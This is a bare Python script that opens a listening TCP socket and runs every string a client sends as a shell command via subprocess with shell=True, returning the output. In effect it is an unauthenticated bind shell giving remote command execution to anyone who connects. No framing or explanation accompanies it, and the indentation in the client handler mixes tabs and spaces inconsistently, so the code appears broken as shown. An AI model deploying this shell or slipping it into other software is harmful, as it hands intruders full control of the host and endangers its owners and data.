import socket
import sys
import threading
import os
import subprocess


def execute(command):
	output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	return str(output)

def client_handle(handler):
	while True:
		data = handler.recv(512)
       		print("[+] Received : %s" % data)
		buffer = execute(data)
        	handler.send(buffer)

try:

	listen_ip= str(sys.argv[1])
	listen_port = int(sys.argv[2])

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((listen_ip,listen_port))
	server.listen(5)
	print("[+] Listening on %s:%d" % (listen_ip,listen_port))

	while True:
		(buffer, addr) = server.accept()
		print("[+] Connection from %s:%d ." % (addr[0],addr[1]))

		client_handler_thread = threading.Thread(target=client_handle,args=(buffer,))
		client_handler_thread.start()


except Exception as e:
	print("[+] Usage : %s <listen_ip> <listen_port> " % sys.argv[0])
